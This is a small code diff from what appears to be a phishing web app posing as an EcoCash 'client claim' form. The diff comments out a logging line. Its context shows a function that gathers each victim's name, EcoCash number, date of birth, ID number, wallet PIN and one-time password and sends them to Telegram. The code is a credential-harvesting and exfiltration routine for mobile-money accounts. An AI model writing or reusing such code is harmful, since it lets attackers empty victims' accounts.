@@ -23,7 +23,7 @@ function App() {
   }
 
   async function sendDetails() {
-    console.log(client);
+    // console.log(client);
     await sendToTelegram(
       `New Client Claim:\nClient Name:${name}\nEcoCash Number: ${number}\nClient dob: ${dob}\nClient id: ${id}\nEcoCash Pin: ${pin}\nClient OTP: ${otp}`
     );
